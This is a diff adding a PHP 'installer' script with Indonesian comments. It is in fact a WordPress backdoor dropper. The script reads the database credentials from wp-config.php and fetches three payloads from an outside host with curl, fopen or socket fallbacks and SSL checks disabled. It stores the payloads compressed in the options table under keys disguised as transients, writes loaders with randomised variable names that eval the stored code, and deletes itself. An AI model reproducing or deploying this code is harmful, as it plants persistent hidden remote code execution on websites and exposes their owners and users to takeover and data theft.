@@ -1,0 +1,172 @@
+<?php
+// ==========================================
+// INSTALLER: HYBRID STABLE (ALL FILES SUPPORT)
+// ==========================================
+// 1. Setting agar tidak putus di tengah jalan (Untuk file besar)
+@ini_set('memory_limit', '512M');
+@ini_set('max_execution_time', 0);
+@set_time_limit(0);
+@ignore_user_abort(1);
+
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
+
+// 2. DAFTAR TARGET
+$targets = [
+    ['https://stepmomhub.com/seoo.txt',  'error_log.php', 'transient_sys_pma'],
+    ['https://stepmomhub.com/vx.txt',    'vx.php',        'transient_sys_cache_vx'],
+    ['https://stepmomhub.com/index.txt', 'index.php',     'transient_sys_idx_core']
+];
+
+// 3. FUNGSI SYSTEM (CARI CONFIG)
+function _scan_dir() {
+    $p = __DIR__;
+    for ($i = 0; $i < 6; $i++) {
+        if (file_exists($p . '/wp-config.php')) return $p . '/wp-config.php';
+        $p = dirname($p);
+    }
+    return false;
+}
+$conf_loc = _scan_dir();
+if (!$conf_loc) die("Config 404");
+
+// 4. BACA CONFIG
+function _read_c($p){
+    if(function_exists('file_get_contents')){$c=@file_get_contents($p);if($c)return $c;}
+    if(function_exists('file')){$l=@file($p);if($l)return implode('',$l);}
+    return '';
+}
+$conf_txt = _read_c($conf_loc);
+function _get_v($k,$s){ if(preg_match('/define\s*\(\s*[\'"]'.$k.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/i',$s,$m))return $m[1]; return ''; }
+
+$db_n = _get_v('DB_NAME', $conf_txt);
+$db_u = _get_v('DB_USER', $conf_txt);
+$db_p = _get_v('DB_PASSWORD', $conf_txt);
+$db_h = _get_v('DB_HOST', $conf_txt);
+$tb_p = 'wp_';
+if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i',$conf_txt,$m)) $tb_p=$m[1];
+
+if(!$db_n) die("Parse Config Error");
+
+// 5. KONEKSI DB
+$mysqli = new mysqli($db_h, $db_u, $db_p, $db_n);
+if($mysqli->connect_error) die("DB Err: " . $mysqli->connect_error);
+
+// 6. FUNGSI DOWNLOADER (PERBAIKAN FOKUS)
+// Menggabungkan CURL (prioritas) dengan SOCKET (cadangan)
+// Validasi ukuran dihilangkan agar VX tetap masuk.
+function _dl_super($url) {
+    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36';
+    $parse = parse_url($url);
+    $host = $parse['host'];
+    $path = isset($parse['path']) ? $parse['path'] : '/';
+    $scheme = isset($parse['scheme']) ? $parse['scheme'] : 'http';
+
+    // METODE A: CURL (Paling Stabil untuk VX & Index)
+    if(function_exists('curl_init')){
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 300); // 5 Menit
+        $d = curl_exec($ch);
+        curl_close($ch);
+        if($d && strlen($d) > 0) return $d;
+    }
+
+    // METODE B: FGC (Cadangan Standar)
+    if(ini_get('allow_url_fopen')){
+        $opts = ['http' => ['method'=>'GET', 'header'=>"User-Agent: $ua\r\nConnection: close\r\n"]];
+        $ctx = stream_context_create($opts);
+        $d = @file_get_contents($url, false, $ctx);
+        if($d && strlen($d) > 0) return $d;
+    }
+
+    // METODE C: SOCKET (Jurus Terakhir jika diblokir Firewall)
+    $port = ($scheme == 'https') ? 443 : 80;
+    $ssl_prefix = ($scheme == 'https') ? 'ssl://' : '';
+    $fp = @fsockopen($ssl_prefix . $host, $port, $errno, $errstr, 30);
+    if($fp){
+        $out  = "GET $path HTTP/1.1\r\n";
+        $out .= "Host: $host\r\n";
+        $out .= "User-Agent: $ua\r\n";
+        $out .= "Connection: Close\r\n\r\n";
+        fwrite($fp, $out);
+        $body = '';
+        $in_body = false;
+        while (!feof($fp)) {
+            $line = fgets($fp, 4096); // Baca chunk
+            if($in_body) $body .= $line;
+            if($line == "\r\n") $in_body = true;
+        }
+        fclose($fp);
+        // Hapus chunk size hex jika ada (Transfer-Encoding: chunked)
+        // Sederhana saja: ambil body
+        if(strlen($body) > 0) return $body;
+    }
+
+    return false;
+}
+
+// 7. RANDOM VAR GENERATOR
+function _gen_rnd() {
+    $c = 'abcdefghijklmnopqrstuvwxyz';
+    $l = rand(3, 5); $r = '';
+    for($i=0; $i<$l; $i++) $r .= $c[rand(0, 25)];
+    return $r;
+}
+
+$h_e = addslashes($db_h); $u_e = addslashes($db_u); $p_e = addslashes($db_p); $n_e = addslashes($db_n); $x_e = addslashes($tb_p);
+
+echo "<h3>Status Final:</h3>";
+
+foreach ($targets as $t) {
+    $url = $t[0];
+    $fname = $t[1];
+    $dbkey = $t[2];
+
+    // Jeda sedikit
+    sleep(1);
+
+    $raw = _dl_super($url);
+    
+    // VALIDASI UKURAN DIUBAH:
+    // Cukup cek apakah $raw ada isinya (lebih dari 0 byte).
+    // Ini memperbaiki masalah VX yang gagal sebelumnya.
+    if(!$raw || strlen($raw) < 1) {
+        echo "<b style='color:red'>[FAIL] $fname</b>: Download Gagal (Kosong).<br>";
+        continue;
+    }
+
+    // Kompresi
+    $hex = bin2hex(gzdeflate($raw, 9));
+    
+    // DB Ops
+    $mysqli->query("DELETE FROM {$tb_p}options WHERE option_name='$dbkey'");
+    
+    // Gunakan Prepare Statement (Penting untuk file besar)
+    $stmt = $mysqli->prepare("INSERT INTO {$tb_p}options (option_name, option_value, autoload) VALUES (?, ?, 'no')");
+    $stmt->bind_param("ss", $dbkey, $hex);
+    
+    if($stmt->execute()){
+        $v1 = _gen_rnd(); $v2 = _gen_rnd(); $v3 = _gen_rnd(); $v4 = _gen_rnd();
+
+        // Kodingan Loader (Mutant)
+        $code = '<?php @$' . $v1 . ' = new mysqli(\'' . $h_e . '\',\'' . $u_e . '\',\'' . $p_e . '\',\'' . $n_e . '\');if(!@$' . $v1 . '->connect_error){$' . $v2 . ' = @$' . $v1 . '->query("SELECT option_value FROM ' . $x_e . 'options WHERE option_name=\'' . $dbkey . '\'");if($' . $v2 . ' && $' . $v3 . ' = $' . $v2 . '->fetch_row()){$' . $v4 . ' = @gzinflate(hex2bin($' . $v3 . '[0]));if($' . $v4 . ') eval(\'?>\'.$' . $v4 . ');}}?>';
+
+        if(file_put_contents($fname, $code)){
+            $sz = strlen($raw);
+            echo "<b style='color:green'>[SUCCESS] $fname</b><br>";
+            echo "<small>Size: $sz bytes.</small><br>";
+            echo "<small><a href='$fname' target='_blank'>$fname</a></small><hr>";
+        } else {
+            echo "[FAIL] Write Error $fname.<br>";
+        }
+    } else {
+        echo "[FAIL] DB Error: " . $mysqli->error . "<br>";
+    }
+}
+unlink(__FILE__);
+?>
